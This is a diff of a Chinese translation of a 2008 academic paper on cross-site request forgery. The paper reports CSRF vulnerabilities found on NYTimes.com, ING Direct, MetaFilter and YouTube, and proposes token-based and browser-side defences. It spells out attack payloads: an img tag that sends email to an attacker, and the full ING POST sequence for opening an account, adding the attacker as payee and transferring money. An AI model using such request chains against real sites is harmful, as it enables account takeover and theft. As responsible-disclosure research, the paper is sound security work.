@@ -21,11 +21,10 @@ http://citp.princeton.edu/csrf/
 在第3节中，我们介绍了四个主要站点发现的四个严重的CSRF漏洞。 这些漏洞允许攻击者从用户银行帐户中转账，收获用户电子邮件地址，侵犯用户隐私和妥协用户帐户。
 
 
-—————————————————  
-(1) 跨站点请求伪造攻击也称为跨站点参考伪造，XSRF，会话骑乘和混淆副攻击。我们使用术语CSRF，因为它似乎是这种攻击最常用的术语。  
-(2) 在ACM数字图书馆搜索“跨站脚本”（与CSRF不同）返回72篇论文，搜索“xsrf OR csrf”只返回四篇论文。 在Safari Books Online上搜索“xss”（收集了4752本技术书籍），该书出现在96本书中，而“csrf OR xsrf”只出现在13本书中。
+ 
+> (1) 跨站点请求伪造攻击也称为跨站点参考伪造，XSRF，会话骑乘和混淆副攻击。我们使用术语CSRF，因为它似乎是这种攻击最常用的术语。  
+> (2) 在ACM数字图书馆搜索“跨站脚本”（与CSRF不同）返回72篇论文，搜索“xsrf OR csrf”只返回四篇论文。 在Safari Books Online上搜索“xss”（收集了4752本技术书籍），该书出现在96本书中，而“csrf OR xsrf”只出现在13本书中。
 
----
 
 
   
@@ -42,7 +41,7 @@ http://citp.princeton.edu/csrf/
 
 #### 2.1一个例子  
 
-让我们考虑一个容易遭受CSRF攻击的网站的假设例子。该网站是一个基于网络的电子邮件网站，允许用户发送和接收电子邮件。该站点使用隐式身份验证（见第2.2节）来验证其用户。一个页面  http://example.com/compose.htm 包含一个HTML表单，允许用户输入收件人的电子邮件地址，主题和消息以及一个“发送电子邮件”按钮。
+让我们考虑一个容易遭受CSRF攻击的网站的假设例子。该网站是一个基于网络的电子邮件网站，允许用户发送和接收电子邮件。该站点使用隐式身份验证（见第2.2节）来验证其用户。一个页面  `http://example.com/compose.htm` 包含一个HTML表单，允许用户输入收件人的电子邮件地址，主题和消息以及一个“发送电子邮件”按钮。
 
 ```
 <form action="http://example.com/send_email.htm" method="GET">  
@@ -53,35 +52,36 @@ Message: <textarea name="msg"></textarea>
 </form>
 ```
 
-当example.com的用户点击“发送电子邮件”时，他输入的数据将作为GET请求发送到  http://example.com/send_email.htm 。由于GET请求只需将表单数据附加到URL，用户将被发送到以下URL（假设他输入“bob@example.com”作为收件人，“hello”作为主题，“该提案的状态如何？”作为消息）：
+当`example.com`的用户点击“发送电子邮件”时，他输入的数据将作为GET请求发送到  `http://example.com/send_email.htm` 。由于GET请求只需将表单数据附加到URL，用户将被发送到以下URL（假设他输入“bob@example.com”作为收件人，“hello”作为主题，“该提案的状态如何？”作为消息）：
 ```
-http://example.com/send_email.htm?to=bob%40example.com&subject=hello&msg=What%27s+the+status+of+that+proposal%3F(3)
+http://example.com/send_email.htm?to=bob%40example.com&subject=hello&msg=What%27s+the+status+of+that+proposal%3F (3)
 ```
 
-—————————————————  
-(3) URL数据编码，将@转换成％40等等
-
----
+ 
+> (3) URL数据编码，将@转换成％40等等
 
 
-发送email.htm的页面将收到它收到的数据，并从用户发送电子邮件给收件人。注意，发送email.htm只需要获取数据并对该数据执行操作。它不在乎发出请求的位置，只有请求已经出现。这意味着，如果用户手动将上述URL输入到浏览器中，则example.com仍然会发送电子邮件。例如，如果用户在浏览器中输入以下三个URL，则发送email.htm将发送三封电子邮件（每个邮件给Bob，Alice和Carol）：
+
+发送`email.htm`的页面将收到它收到的数据，并从用户发送电子邮件给收件人。注意，发送`email.htm`只需要获取数据并对该数据执行操作。它不在乎发出请求的位置，只有请求已经出现。这意味着，如果用户手动将上述URL输入到浏览器中，则`example.com`仍然会发送电子邮件。例如，如果用户在浏览器中输入以下三个URL，则发送`email.htm`将发送三封电子邮件（每个邮件给Bob，Alice和Carol）：
+
 ```
 http://example.com/send_email.htm?to=bob%40example.com&subject=hi+Bob&msg=test
 http://example.com/send_email.htm?to=alice%40example.com&subject=hi+Alice&msg=test
 http://example.com/send_email.htm?to=carol%40example.com&subject=hi+Carol&msg=test
 ```
 
-在这里可能发生CSRF攻击，因为send email.htm会接收到任何数据，并发送电子邮件。它不会验证数据源自compose.htm上的表单。因此，如果攻击者可以使用用户send_email.htm的请求，则该页面将导致example.com代表包含攻击者选择的任何数据的用户发送电子邮件，并且攻击者将成功执行CSRF攻击。
+在这里可能发生CSRF攻击，因为`send email.htm`会接收到任何数据，并发送电子邮件。它不会验证数据源自`compose.htm`上的表单。因此，如果攻击者可以使用用户`send_email.htm`的请求，则该页面将导致`example.com`代表包含攻击者选择的任何数据的用户发送电子邮件，并且攻击者将成功执行CSRF攻击。
 
 
 
-为了利用此漏洞，攻击者需要强制用户的浏览器发送send_email.htm的请求，以执行一些恶意的操作。（我们假设用户访问攻击者控制的站点，目标站点不会防御CSRF攻击）。具体来说，攻击者需要从他的站点到example.com建立一个跨站点请求。不幸的是，HTML提供了许多方法来提出这样的请求。例如，\<img\>标签将导致浏览器加载任何设置为src属性的URI，即使该URI不是图像（因为浏览器只能在加载URI后才能告诉URI是一个图像）。攻击者可以使用以下代码创建一个页面：
+为了利用此漏洞，攻击者需要强制用户的浏览器发送`send_email.htm`的请求，以执行一些恶意的操作。（我们假设用户访问攻击者控制的站点，目标站点不会防御CSRF攻击）。具体来说，攻击者需要从他的站点到`example.com`建立一个跨站点请求。不幸的是，HTML提供了许多方法来提出这样的请求。例如，\<img\>标签将导致浏览器加载任何设置为src属性的URI，即使该URI不是图像（因为浏览器只能在加载URI后才能告诉URI是一个图像）。攻击者可以使用以下代码创建一个页面：
+
 ```
 <img src="http://example.com/send_email.htm?
 to=mallory%40example.com&subject=Hi&msg=My+email+address+has+been+stolen">
 ```
 
-当用户访问该页面时，将发送请求send_email.htm，然后将从用户向Mallory发送电子邮件。这个例子与我们在“纽约时报”网站上发现的实际漏洞几乎相同，我们在3.1节中介绍。  
+当用户访问该页面时，将发送请求`send_email.htm`，然后将从用户向Mallory发送电子邮件。这个例子与我们在“纽约时报”网站上发现的实际漏洞几乎相同，我们在3.1节中介绍。  
 
 攻击者可能会导致用户浏览器对其他站点执行不必要的操作时，CSRF攻击成功。要使此操作成功，用户必须能够执行此操作。CSRF攻击通常与用户一样强大，意味着用户可以执行的任何操作也可以由攻击者使用CSRF攻击执行。因此，网站给用户的力量越大，可能的CSRF攻击就越严重。  
 
@@ -91,6 +91,7 @@ to=mallory%40example.com&subject=Hi&msg=My+email+address+has+been+stolen">
 
 
 ![image](https://github.com/guangguang831/ns/blob/master/2017-2/%E5%A4%A7%E4%BD%9C%E4%B8%9A/1_cn.png)  
+
 图1：这里，Web浏览器已建立与受信任站点的认证会话。 只有当Web浏览器通过授权会话发出请求时，才能执行“可信操作”。
 
 ![image](https://github.com/guangguang831/ns/blob/master/2017-2/%E5%A4%A7%E4%BD%9C%E4%B8%9A/2_cn.png)  
@@ -131,9 +132,9 @@ CSRF和XSS攻击的不同之处在于XSS攻击需要JavaScript，而CSRF攻击�
 
 > 纽约时报网站是“网络上第一大报纸网站”[10]。 
 
-我们在NYTimes.com中发现了一个CSRF漏洞，使得用户的电子邮件地址可供攻击者使用。如果您是NYTimes.com会员，则可以使用此攻击来确定您的电子邮件地址，并使用它发送垃圾邮件或识别您。
+我们在`NYTimes.com`中发现了一个CSRF漏洞，使得用户的电子邮件地址可供攻击者使用。如果您是`NYTimes.com`会员，则可以使用此攻击来确定您的电子邮件地址，并使用它发送垃圾邮件或识别您。
 
-这种攻击利用了NYTimes.com的“Email This”功能。“Email This”是一种工具，允许用户通过指定收件人的电子邮件地址和可选的个人消息发送链接到NYTimes.com文章。收件人收到一封类似于以下内容的电子邮件：  
+这种攻击利用了`NYTimes.com`的“Email This”功能。“Email This”是一种工具，允许用户通过指定收件人的电子邮件地址和可选的个人消息发送链接到`NYTimes.com`文章。收件人收到一封类似于以下内容的电子邮件：  
 
 该页面已通过以下方式发送给您：[用户的电子邮件地址]  
 发件人的留言：  
@@ -143,9 +144,9 @@ CSRF和XSS攻击的不同之处在于XSS攻击需要JavaScript，而CSRF攻击�
 约翰•马克福夫 
 一个计算机安全研究小组已经开发出一种从计算机硬盘窃取加密信息的方法。
 
-要利用此漏洞，攻击者会导致登录用户的浏览器向 NYTimes.com “Email This”页面发送请求。接受“Email This”请求的页面不会防止CSRF攻击，因此用户的浏览器将会将请求发送到 NYTimes.com ，这将触发它发送电子邮件到攻击者选择的地址。如果攻击者将收件人电子邮件地址更改为他自己的电子邮件地址，他将收到包含用户电子邮件地址的 NYTimes.com 的电子邮件。
+要利用此漏洞，攻击者会导致登录用户的浏览器向 `NYTimes.com` “Email This”页面发送请求。接受“Email This”请求的页面不会防止CSRF攻击，因此用户的浏览器将会将请求发送到 `NYTimes.com` ，这将触发它发送电子邮件到攻击者选择的地址。如果攻击者将收件人电子邮件地址更改为他自己的电子邮件地址，他将收到包含用户电子邮件地址的 `NYTimes.com` 的电子邮件。
 
-利用此漏洞非常简单。每个NYTimes.com上的文章包含指向“Email This”页面的链接，其中包含用户输入收件人电子邮件地址的表单。 此表单还包含每个文章唯一的隐藏变量。 这是一个示例形式：
+利用此漏洞非常简单。每个`NYTimes.com`上的文章包含指向“Email This”页面的链接，其中包含用户输入收件人电子邮件地址的表单。 此表单还包含每个文章唯一的隐藏变量。 这是一个示例形式：
 
 ```
 <form 
@@ -165,11 +166,11 @@ enctype="application/x-www-form-urlencoded">
 ```
 
 
-由于NYTimes.com不区分GET和POST请求，攻击者可以将此表单转换为GET请求，以后可以在\<img\>标记中使用。将表单转换为GET请求涉及将每个参数附加到URL的查询字符串（格式为NAME = VALUE，以＆符号分隔）。  
+由于`NYTimes.com`不区分GET和POST请求，攻击者可以将此表单转换为GET请求，以后可以在\<img\>标记中使用。将表单转换为GET请求涉及将每个参数附加到URL的查询字符串（格式为NAME = VALUE，以＆符号分隔）。  
 
-一旦攻击者构建了URL，他就可以将其设置为]<img\>标签的SRC属性。如果NYTimes.com的登录用户访问包含此\<img\>标签的任何页面，浏览器将使用攻击者的参数加载“Email This”页面，导致NYTimes.com向包含用户电子邮件的攻击者发送电子邮件地址。攻击者可以存储此电子邮件地址以供日后滥用（例如，为垃圾邮件发送），或使用电子邮件地址来识别他自己网站的访问者。这可能导致严重的隐私后果，例如允许有争议地点的运营商（例如政治或非法）识别其用户。  
+一旦攻击者构建了URL，他就可以将其设置为\<img\>标签的SRC属性。如果`NYTimes.com`的登录用户访问包含此\<img\>标签的任何页面，浏览器将使用攻击者的参数加载“Email This”页面，导致`NYTimes.com`向包含用户电子邮件的攻击者发送电子邮件地址。攻击者可以存储此电子邮件地址以供日后滥用（例如，为垃圾邮件发送），或使用电子邮件地址来识别他自己网站的访问者。这可能导致严重的隐私后果，例如允许有争议地点的运营商（例如政治或非法）识别其用户。  
 
-我们在Firefox 2.0.0.6，Opera 9.23和Safari 3.0.3（522.15.5）中验证了此次攻击。由于附录A中描述的原因，它在Internet Explorer中不起作用。我们在2007年9月通知了“纽约时报”这个漏洞。这是2008年10月1日修复的。
+我们在`Firefox 2.0.0.6`，`Opera 9.23` 和 `Safari 3.0.3（522.15.5）` 中验证了此次攻击。由于附录A中描述的原因，它在Internet Explorer中不起作用。我们在2007年9月通知了“纽约时报”这个漏洞。这是2008年10月1日修复的。
 
 #### 3.2 ING Direct（ingdirect.com） 
 
@@ -180,17 +181,16 @@ enctype="application/x-www-form-urlencoded">
 由于ING没有明确地防范CSRF攻击，因此从用户帐户转移资金就像模拟用户在转移资金时所采取的步骤一样简单。 这些步骤包括以下操作：
 1.	攻击者代表用户创建一个支票账户。(4)
 
-—————————————————  
-(4) ING Direct允许以最初的金额即时创建支票账户。
 
----
+> (4) ING Direct允许以最初的金额即时创建支票账户。
+
 
 
 （a）攻击者使用户的浏览器访问ING的“打开新帐户”页面：  
-- 向 https://secure.ingdirect.com/myaccount/INGDirect.html?command=gotoOpenOCA 发送GET请求 
+- 向 `https://secure.ingdirect.com/myaccount/INGDirect.html?command=gotoOpenOCA` 发送GET请求 
 
 （b）攻击者导致用户的浏览器选择一个“单一”帐户：  
-- 通过以下参数向 https://secure.ingdirect.com/myaccount/INGDirect.html 发送POST请求：  
+- 通过以下参数向 `https://secure.ingdirect.com/myaccount/INGDirect.html` 发送POST请求：  
 
 ```
 command=ocaOpenInitial&YES, I 
@@ -199,7 +199,7 @@ WANT TO CONTINUE..y=25
 ```
 
 （c）攻击者选择任意数量的资金从用户的储蓄账户转移到新的欺诈账户：  
-- 通过以下参数向 https://secure.ingdirect.com/myaccount/INGDirect.html 发送POST请求：
+- 通过以下参数向 `https://secure.ingdirect.com/myaccount/INGDirect.html` 发送POST请求：
 ```
 command=ocaValidateFunding&PRIMARY
 CARD=true&JOINTCARD=true&Account
@@ -213,7 +213,7 @@ CONTINUE..y=25&XTYPE=4000USD
 帐号名称可以是任何字符串，攻击者不需要知道它是一个简单的昵称，它将用于新帐户。
 ```
 （d）攻击者使用户的浏览器点击最终的“开户”按钮，导致ING代表用户开立一个新的支票帐户：  
-- 通过以下参数向 https://secure.ingdirect.com/myaccount/INGDirect.html 发送POST请求：
+- 通过以下参数向 `https://secure.ingdirect.com/myaccount/INGDirect.html` 发送POST请求：
 ```
 command=ocaOpenAccount&Agree
 ElectronicDisclosure=yes&AgreeTerms
@@ -226,10 +226,10 @@ CONTINUE.=Submit
 2.攻击者将自己作为收款人添加到用户帐户中。 
 
 （a）攻击者导致用户的浏览器访问ING的“添加人员”页面：  
-- 向 https://secure.ingdirect.com/myaccount/INGDirect.html?command=goToModifyPersonalPayee&Mode=Add&from=displayEmailMoney 发送GET请求
+- 向 `https://secure.ingdirect.com/myaccount/INGDirect.html?command=goToModifyPersonalPayee&Mode=Add&from=displayEmailMoney` 发送GET请求
 
 （b）攻击者使用户的浏览器输入攻击者的信息：  
-- 通过以下参数向 https://secure.ingdirect.com/myaccount/INGDirect.html 发送POST请求：
+- 通过以下参数向 `https://secure.ingdirect.com/myaccount/INGDirect.html` 发送POST请求：
 ```
 command=validateModifyPersonalPayee
 &from=displayEmailMoney&PayeeName
@@ -243,7 +243,7 @@ YES, I WANT TO CONTINUE..x=44
 ```
 
 （c）攻击者使用户的浏览器确认攻击者是有效的收款人：  
-- 通过以下参数向 https://secure.ingdirect.com/myaccount/INGDirect.html 发送POST请求：
+- 通过以下参数向 `https://secure.ingdirect.com/myaccount/INGDirect.html` 发送POST请求：
 ```
 command=modifyPersonalPayee&from=
 displayEmailMoney&YES, I WANT TO
@@ -254,7 +254,7 @@ CONTINUE..y=25
 3.攻击者将资金从用户账户转移到自己的账户。
 
 （a）攻击者使用户的浏览器输入一笔钱发送给攻击者：
-- 通过以下参数向 https://secure.ingdirect.com/myaccount/INGDirect.html 发送POST请求：
+- 通过以下参数向 `https://secure.ingdirect.com/myaccount/INGDirect.html` 发送POST请求：
 ```
 command=validateEmailMoney&CNSPayID
 =5000&Amount=[TRANSFER AMOUNT]
@@ -267,7 +267,7 @@ Money
 ```
 
 （b）攻击者使用户的浏览器确认应发送资金：
-- 通过以下参数向 https://secure.ingdirect.com/myaccount/INGDirect.html 发送POST请求：
+- 通过以下参数向 `https://secure.ingdirect.com/myaccount/INGDirect.html` 发送POST请求：
 ```
 command=emailMoney&Amount=
 [TRANSFER AMOUNT]Comments=
@@ -282,7 +282,7 @@ CONTINUE..y=25
 
 这种攻击假定用户没有将其他收款人添加到他的ING Direct支票账户。这次攻击很可能已经被修改，没有这个限制。  
 
-我们在Firefox 2.0.0.3和Internet Explorer 7.0.5中验证了这一攻击。我们没有在其他浏览器中测试这种攻击。我们已经通知了ING这个漏洞，并已经修复。
+我们在`Firefox 2.0.0.3`和`Internet Explorer 7.0.5`中验证了这一攻击。我们没有在其他浏览器中测试这种攻击。我们已经通知了ING这个漏洞，并已经修复。
 
 
 #### 3.3 MetaFilter（metafilter.com） 
@@ -303,7 +303,7 @@ action.cfm?user_email=[ATTACKER’S EMAIL]"/>
 
 虽然这将改变任何登录用户的电子邮件地址，攻击者将不知道哪个用户的帐户被修改。攻击者可以通过利用另一个MetaFilter功能来发现这个功能，该功能允许用户将其他用户标记为“联系人”。攻击者可以使用与上述类似的CSRF，以使用户在不知情的情况下将攻击者添加到他的联系人列表中。  
 
-我们在Firefox 2.0.0.6中验证了这个攻击。由于附录A中描述的原因，它在Internet Explorer中不起作用。我们没有在其他浏览器中测试此攻击。我们向MetaFilter报告了这个漏洞，并确认它在两天内得到修复。
+我们在`Firefox 2.0.0.6`中验证了这个攻击。由于附录A中描述的原因，它在Internet Explorer中不起作用。我们没有在其他浏览器中测试此攻击。我们向MetaFilter报告了这个漏洞，并确认它在两天内得到修复。
 
 #### 3.4 YouTube (youtube.com)  
 
@@ -324,7 +324,7 @@ id=[VIDEO ID]&playlist_id=&add_to_favorite=
 
 攻击者可能已经与用户的整个联系人列表（“朋友”，“家人”等）共享一个视频。“共享”仅仅意味着发送一个链接到一个视频附带一个可选的消息。该消息可以包含一个链接，这意味着攻击者可以强制用户包含一个链接到包含攻击的网站。接收到该消息的用户可能会点击该链接，从而使得攻击以病毒传播。  
 
-我们在Firefox 2.0.0.6中验证了这些攻击。由于附录A中描述的原因，它们在Internet Explorer中不工作。我们没有在其他浏览器中测试这些攻击。我们将这些漏洞报告给YouTube，并且似乎已经得到更正。
+我们在`Firefox 2.0.0.6`中验证了这些攻击。由于附录A中描述的原因，它们在Internet Explorer中不工作。我们没有在其他浏览器中测试这些攻击。我们将这些漏洞报告给YouTube，并且似乎已经得到更正。
 
 ### 4防止CSRF
 
@@ -344,7 +344,7 @@ id=[VIDEO ID]&playlist_id=&add_to_favorite=
 
 注意：我们在下面假设敌手不能修改与目标站点相关的用户的Cookie。除非攻击者是一个活跃的网络攻击者，否则相同的原始策略保证是这种情况。下面的解决方案不能防止活跃的网络攻击者（详见[17]）。  
 
-最近，已经引入了许多框架来简化各种语言的网页开发。例子包括Code Igniter [4]（PHP），Ruby on Rails [8]（Ruby），django [5]（Python），Catalyst [3]（Perl）和Struts [9]（Java）。这些框架的一个主要好处是可以直接在框架中构建CSRF保护，保护开发人员，同时使他们免于自行实施保护。在框架层面实施的CSRF保护将受到更大的监督，由于疏忽或对CSRF的误解而引入错误的可能性较低。
+最近，已经引入了许多框架来简化各种语言的网页开发。例子包括`Code Igniter [4]（PHP）`，`Ruby on Rails [8]（Ruby）`，`django [5]（Python）`，`Catalyst [3]（Perl）`和`Struts [9]（Java）`。这些框架的一个主要好处是可以直接在框架中构建CSRF保护，保护开发人员，同时使他们免于自行实施保护。在框架层面实施的CSRF保护将受到更大的监督，由于疏忽或对CSRF的误解而引入错误的可能性较低。
   
 个别站点和框架可以通过采取以下防范措施来保护自己免受CSRF攻击： 
 
@@ -353,10 +353,9 @@ id=[VIDEO ID]&playlist_id=&add_to_favorite=
 特别是，已经确定GET和HEAD方法不应该具有采取除了检索之外的其他行为的意义。这些方法应该被认为是“安全的”[21]。
 虽然这种保护措施本身并不能阻止CSRF（因为攻击者可以使用POST请求），但它可以与（2）结合起来，以完全防止CSRF漏洞(5)。
 
-—————————————————  
-(5)我们假设对手不能修改用户的cookies
 
----
+> (5)我们假设对手不能修改用户的cookies
+
 
 
 2.要求所有POST请求包含一个伪随机值
@@ -379,6 +378,7 @@ id=[VIDEO ID]&playlist_id=&add_to_favorite=
 
 之前已经提出了在表单中使用伪随机值，但是许多提出的实现不具有上述特征。 例如，Johns和Winter [24]和Schreiber [27]需要服务器状态，而Shiflett [28]则打破了标签浏览。 据我们所知，以前提出的解决方案没有强调使用典型浏览行为的重要性。  
 任何拦截POST请求和“包装”命令来生成\<form\>标记的框架都可以透明地将上述CSRF保护构建到框架中。例如，如果框架需要开发者调用函数open（...）; 为了生成一个\<form ...\>标签，可以修改框架，以便每次创建表单时自动生成伪随机值：
+
 ```
 <form ...>
 <input type="hidden" name="csrf value"
@@ -392,10 +392,9 @@ value="8dcb5e56904d9b7d4bbf333afdd154ca">
 
 
 
-—————————————————  
-(6)我们的Code Ignite插件：http://www.cs.princeton.edu/~wzeller/csrf/ci/
 
----
+> (6)我们的Code Ignite插件：http://www.cs.princeton.edu/~wzeller/csrf/ci/
+
 
 
 
@@ -411,8 +410,8 @@ value="8dcb5e56904d9b7d4bbf333afdd154ca">
 
 这个Firefox扩展可以在我们的网站上下载（7）。
 
-—————————————————  
-（7）我们的CSRF Firefox插件：http://www.cs.princeton.edu/~wzeller/csrf/protector/
+
+> （7）我们的CSRF Firefox插件：http://www.cs.princeton.edu/~wzeller/csrf/protector/
 
 #### 5相关工作
 接受CSRF攻击的主要原因是OmniTI的Chris Shiflett [28]和WhiteHat Security的Jeremiah Grossman [23]的工作。 Burns [19]和Schreiber [27]对CSRF攻击提供了全面的介绍，但是没有描述工作中的漏洞.Johns和Winter[24]描述了RequestRodeo，一种客户端防止使用HTTP代理的CSRF攻击。 这种方法有一些限制，他们描述了一个类似于我们的浏览器插件作为未来可能的工作。他们在[25]中通过实施有限的本地网络扩展了这项工作，防止CSRF攻击本地资源。
@@ -521,6 +520,7 @@ http://shiflett.org/blog/2006/sep/the-dangers-of-cross-domainajax-with-flash , S
 
 
 #### A  Internet Explorer和CSRF
+
 可以使用Cookie来跟踪多个网站上的用户。例如，假设广告客户在自己的服务器上托管了大量发布商网站包含的图像（广告）。当图片被显示时，广告商可以设置cookie，这将允许广告商在访问不同的发布者站点时识别单个用户。也就是说，当用户浏览发布者网站并加载广告客户的图片时，他的cookie将被发回给广告客户并被唯一标识。广告商可以使用这些cookies来编辑关于用户的浏览习惯的数据。
 
 关注cookies对用户隐私的这种不利影响导致了隐私偏好平台（P3P）的创建。P3P“提供了一种通用的语法和传输机制，使网站能够将其隐私惯例传达给Internet Explorer 6（或任何其他用户代理）”[7]。从Internet Explorer 6开始，Microsoft要求所有站点都包含P3P策略，以便接收第三方Cookie。
@@ -535,3 +535,37 @@ http://shiflett.org/blog/2006/sep/the-dangers-of-cross-domainajax-with-flash , S
 Internet Explorer的P3P策略对CSRF漏洞有一个有趣的影响。对于CSRF攻击（Internet Explorer认为这些网站安全且允许Cookie），具有有效P3P策略的站点不受保护，而没有策略的站点受到保护（Internet Explorer认为这些站点不安全并阻止Cookie）。请注意，这仅适用于CSRF影响使用Cookie进行身份验证的网站的漏洞。使用其他类型身份验证的站点可能仍然容易受到CSRF攻击。
 
 总而言之，当使用“会话cookie”身份验证和目标站点不实施P3P策略时，Internet Explorer对P3P的使用会导致IE的用户受到CSRF攻击的保护。这种“保护”是P3P政策的一个意外后果，不应该只用于防止CSRF攻击。相反，站点应该实现我们的服务器端建议，如4.1节所述。
+
+
+#### B 同源政策
+
+网页浏览器有一项艰巨的任务，允许用户维护与多个网站的安全的私人连接，同时允许访问包含不可信的代码的不受信任的网站。另外，网站能够加载来自不同域的资源。例如，网站`a.com`可以分别使用\<img\>或\<script\>标签从`b.com`加载图片或JavaScript。但是，如果用户登录到受信任的站点，不受信任的第三方显然应该无法读取受信任站点的内容。希望允许不受信任的站点显示来自外部站点的数据，同时仍然保持这些数据的隐私导致了同源策略的创建[11]。这个策略同时定义了访问不同来源的数据时的“来源”和网站的能力。政策认为“如果协议，端口（如果给定）和主机是相同的两个页面是相同的页面“[11]。根据同源策略，站点无法读取或修改不同来源的资源，但它可以向不同来源发送资源请求。因此，虽然evil.com可以使用\<img\>标签将`http://trusted.com/image.gif`包含在其网站中，但它无法读取该图像的像素数据。同样，虽然`evil.com`可以使用\<iframe\>标签在其网站中包含 `http://trusted.com/private.htm` ，但它无法访问或修改浏览器显示的页面内容。
+
+同源策略只能防止第三方站点从其他站点读取数据，并不妨碍这些第三方站点发送请求。由于CSRF攻击是由请求发送引起的（导致在服务器端执行一些操作），相同的原始策略不会阻止CSRF攻击。 相反，它只能保护第三方网站上的数据的隐私。
+
+网站有时会发现跨不同域名进行沟通是有用的或必要的。 Adobe提出了一种称为跨域策略的机制[2]，它允许其Flash插件在某些情况下与不同的域进行通信（发送和接收数据）。 这个机制目前只被Flash使用。 具体而言，一个网站可以指定哪些第三方网站可以访问它。 如果受信任的站点在其跨域策略文件中列出了第三方站点，则第三方站点只能联系受信任的站点。 以下示例跨域策略文件允许访问源自 `www.friendlysite.com`，`* .trusted.com` 和IP地址 `64.233.167.99 `的请求。 这些文件被命名为`crossdomain.xml`并放置在域的根目录下。
+
+
+
+```
+<?xml version="1.0"?>
+<cross-domain-policy>
+<allow-access-from
+domain="www.friendlysite.com" />
+<allow-access-from domain="*.trusted.com" />
+<allow-access-from domain="64.233.167.99" />
+</cross-domain-policy>
+```
+
+
+假设上面的文件位于 `http://trusted.com/crossdomain.xml` 。如果一个请求是由`evil.com`使用Flash进行的`http://trusted.com/private.htm`，Flash将首先加载`http：/ /trusted.com/crossdomain.xml`来验证`evil.com`是否被列为受信任的域。 由于它不在列表中，请求将被阻止。 另一方面，Flash会允许来自`www.friendlysite.com`的相同请求，因为它存在于允许的域名列表中。
+
+如果使用得当，Adobe的跨域策略允许针对CSRF攻击提供比同源策略更多的保护（除非找到匹配的`crossdomain.xml`，否则请求甚至无法启动），并且具有更大的灵活性（如果目标站点信任发起站点）。 但是，跨网域政策经常使用不当，目标网站提供“接受全部”条款。 这允许来自任何站点的第三方访问，无论是恶性的还是良性的。`crossdomain.xml`文件的这种不正确和非常危险的用法，甚至会被Adobe的附属网站(8) `crossdomainxml.org`延续下去。本网站提供了一个“接受所有”跨域策略文件的示例，绝对没有解释使用此策略文件所涉及的危险。 有关使用这种跨域策略文件的危险的更多信息，请参阅Chris Shiflett（[30]和[29]）。
+
+> (8) 域名crossdomainxml.org注册给PowerSDK Software Corp的Theodore E Patrick，他声称自己是LinkedIn系统中的“Adobe Systems Flex的技术推广者”（http://www.linkedin.com/in/tedpatrick）
+
+我们分析了500个顶级网站[16]，发现了143个使用 `crossdomain.xml`策略文件。在这143个站点中，47个站点接受来自第三方站点的所有连接，可能导致CSRF漏洞。
+
+如果小心使用，Adobe的跨域策略可能是有效和安全的。 但是，必须小心解释“接受所有”解决方案的危险。
+
+
